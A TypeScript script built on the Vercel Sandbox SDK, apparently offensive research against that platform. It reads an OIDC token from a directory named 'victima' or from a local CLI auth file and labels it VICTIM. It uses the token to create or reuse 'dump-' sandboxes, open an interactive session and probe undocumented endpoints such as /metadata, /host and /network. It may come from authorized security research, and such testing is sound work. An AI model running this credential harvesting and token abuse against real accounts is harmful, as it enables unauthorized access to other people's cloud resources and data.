import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";

async function main() {
  const client = new APIClient({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  const target = sbxs.find((s: any) => s.name?.startsWith("dump-"));
  const name = target?.name ?? "dump-" + Date.now();
  let s: any;
  if (target) {
    s = await Sandbox.get({ name, token: VICTIM, teamId, projectId });
  } else {
    s = await Sandbox.create({ name, token: VICTIM, teamId, projectId,
      source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" }, ports: [3000] });
  }
  const session = (s as any).session ?? (s as any)._session ?? (await s.ensureClient?.());
  // intentar el endpoint interactive directamente
  const sessionId = (s as any).session?.id ?? (await (s as any)._getSession?.())?.id;
  console.log("sessionId:", sessionId);
  const raw = await (await import("/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js")).APIClient;
  const c2 = new raw({ token: VICTIM, teamId, projectId });
  try {
    const intr: any = await c2.openInteractive({ sessionId, projectId });
    console.log("=== INTERACTIVE RESPONSE (full) ===");
    console.log(JSON.stringify(intr.json ?? intr, null, 1));
  } catch (e) {
    console.log("interactive ERR:", (e as Error).message.slice(0, 300));
  }
  // probar endpoints no documentados en la session
  for (const p of ["/network", "/host", "/metadata", "/placement", "/cell", "/routes/all"]) {
    try {
      const r = await fetch(`https://vercel.com/api/v2/sandboxes/sessions/${sessionId}${p}?projectId=${projectId}`, {
        headers: { Authorization: `Bearer ${VICTIM}` },
      });
      const t = await r.text();
      console.log(`GET ${p} -> ${r.status}: ${t.slice(0, 200)}`);
    } catch (e) { console.log(`GET ${p} ERR:`, (e as Error).message.slice(0, 100)); }
  }
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });